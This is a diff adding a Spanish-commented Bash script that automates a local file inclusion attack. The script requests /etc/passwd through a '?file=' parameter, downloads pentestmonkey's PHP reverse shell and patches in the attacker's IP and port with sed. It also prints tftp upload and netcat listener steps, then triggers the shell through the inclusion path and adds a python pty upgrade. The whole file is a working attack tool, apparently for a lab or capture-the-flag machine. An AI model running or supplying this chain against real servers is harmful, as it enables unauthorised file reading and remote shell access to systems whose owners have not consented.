@@ -1,0 +1,100 @@
+#!/bin/bash
+
+echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+
+
+# Solicitar entrada del usuario para la prueba de inclusión de archivo
+read -p "Test file inclusion? s/N: " inclusion_test
+
+# Verificar si el usuario ingresó 's' o 'S' para realizar la prueba de inclusión de archivo
+if [[ $inclusion_test == "s" || $inclusion_test == "S" ]]; then
+    # Solicitar entrada del usuario para la dirección IP del objetivo
+    read -p "Ip? " target_IP
+    
+    # Construir el comando Curl con la dirección IP proporcionada y la ruta de archivo /etc/passwd
+    curl_command="curl \"http://${target_IP}/?file=/etc/passwd\""
+    
+    # Mostrar el comando que se ejecutará
+    echo -e "\n\033[1;33m_________________________________________________________\033[0m\n"
+    echo "Comando a ejecutar: "
+    echo "$curl_command"
+    echo -e "\n\033[1;33m_________________________________________________________\033[0m\n"
+    
+    # Ejecutar la solicitud Curl con la dirección IP proporcionada
+    eval $curl_command
+fi
+
+# Preguntar al usuario si desea descargar la shell
+echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+read -p "¿Descargar la shell? s/N: " download_shell
+
+# Verificar si el usuario ingresó 's' o 'S' para descargar la shell
+if [[ $download_shell == "s" || $download_shell == "S" ]]; then
+    # Descargar el archivo shell.php desde el repositorio de GitHub
+    curl -o shell.php https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+    echo ""
+    echo "Shell descargada como shell.php"
+    echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+
+    # Solicitar entrada del usuario para la dirección IP
+    read -p "¿ Cual es la IP de tun0 o kali ? " shell_ip
+    
+    # Solicitar entrada del usuario para el puerto de Netcat
+    read -p "Puerto de nc -lvp ? " shell_port
+    
+    # Editar las líneas en el archivo shell.php con la IP y el puerto proporcionados por el usuario
+    sed -i "s/\$ip = '127.0.0.1';/\$ip = '${shell_ip}';/" shell.php
+    sed -i "s/\$port = 1234;/\$port = ${shell_port};/" shell.php
+    echo ""
+    echo "Las lineas del archivo shell.php han sido modificadas con exito."
+    echo "port = 1234; // CHANGE THIS"
+    echo "ip = '127.0.0.1'; // CHANGE THIS"
+    echo ""
+else
+    echo "No se descargara la shell."
+    echo ""
+fi
+
+
+
+# Función para ejecutar la shell PHP
+ejecutar_shell() {
+    # Solicitar al usuario si desea intentar ejecutar la shell
+    read -p "¿Quieres intentar ejecutar la shell? s/N: " ejecutar_shell_respuesta
+    
+    # Verificar si el usuario ingresó 's' o 'S' para intentar ejecutar la shell
+    if [[ $ejecutar_shell_respuesta == "s" || $ejecutar_shell_respuesta == "S" ]]; then
+        
+        # Solicitar entrada del usuario para la dirección IP del servidor
+        echo ""
+        echo -e "\e[31mno te olvides de subirla a el servidor con \e[0m"
+        echo -e "\e[33mtftp IP\e[0m" 
+        echo -e "\e[33mput shell.php\e[0m"
+        echo ""
+        echo -e "\e[34mAbre otra ventana con el comando nc -lvp Puerto\e[0m"
+        echo ""
+        read -p "¿Cual es la IP del servidor? " server_IP
+        
+        # Reemplazar la variable target_IP con la IP del servidor proporcionada por el usuario
+        sed -i "s/target_IP/$server_IP/" shell.php
+        
+        # Mostrar el comando a ejecutar
+        echo "Comando a ejecutar: "
+        echo ""
+        echo "curl http://${server_IP}/?file=/var/lib/tftpboot/shell.php"
+
+        echo -e "\n\033[1;33m_________________________________________________________\033[0m\n"
+        echo "Para tener shell interactiva con python ejecutar dentro de la nc"
+        echo -e "\e[33mpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\e[0m"
+        echo -e "\n\033[1;33m_________________________________________________________\033[0m\n"
+        
+        # Ejecutar la solicitud Curl con la IP del servidor proporcionada por el usuario
+        curl "http://${server_IP}/?file=/var/lib/tftpboot/shell.php"
+    else
+        echo "No se ejecutara la shell."
+    fi
+}
+
+# Llamada a la función ejecutar_shell
+ejecutar_shell
+
